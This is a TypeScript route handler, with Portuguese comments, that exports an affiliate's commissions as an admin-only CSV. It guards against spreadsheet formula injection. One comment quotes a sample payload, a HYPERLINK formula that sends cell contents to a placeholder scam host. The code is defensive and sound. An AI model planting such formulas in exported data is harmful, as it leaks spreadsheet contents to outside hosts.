import { auth } from "@/auth";
import { fetchAdminAffiliateDetail } from "@/lib/api";

// Planilha das comissões de um afiliado (contabilidade e conferência do Pix).
// Separador ";" e vírgula decimal — abre direto no Excel em português.
const STATUS: Record<string, string> = { pending: "Em análise", available: "A pagar", paid: "Pago", canceled: "Cancelado" };

// "Formula injection": sem isto, alguém cria um afiliado/indicado com nome
// tipo `=HYPERLINK("http://golpe"&A1)` e, quando o admin abre este CSV no
// Excel/Sheets, a fórmula roda. Prefixar com "'" neutraliza sem mudar o que
// aparece na célula (Excel esconde o apóstrofo inicial).
function neutralizeFormula(text: string): string {
  return /^[=+\-@\t\r]/.test(text) ? `'${text}` : text;
}

function cell(value: string | number | undefined): string {
  const text = typeof value === "number" ? value.toFixed(2).replace(".", ",") : neutralizeFormula(value ?? "");
  return /[;"\n]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

function date(iso?: string): string {
  return iso ? new Date(iso).toLocaleDateString("pt-BR") : "";
}

export async function GET(_request: Request, { params }: { params: { id: string } }) {
  const session = await auth();
  if (!session?.accessToken || session.user?.role !== "admin") return new Response("Acesso restrito", { status: 403 });
  const detail = await fetchAdminAffiliateDetail(params.id, session.accessToken);
  if (!detail) return new Response("Afiliado não encontrado", { status: 404 });

  const header = ["Data", "Indicado", "Origem", "Valor pago pelo cliente", "Percentual", "Comissão", "Situação", "Libera em", "Pago em", "Comprovante"];
  const rows = detail.commissions.map((row) => [
    date(row.createdAt),
    row.referredName,
    row.description,
    row.baseAmount,
    row.rate,
    row.amount,
    STATUS[row.status] ?? row.status,
    date(row.availableAt),
    date(row.paidAt),
    row.paidNote,
  ]);
  const csv = "﻿" + [header, ...rows].map((line) => line.map(cell).join(";")).join("\r\n");
  return new Response(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="comissoes-${detail.affiliate.code}.csv"`,
    },
  });
}
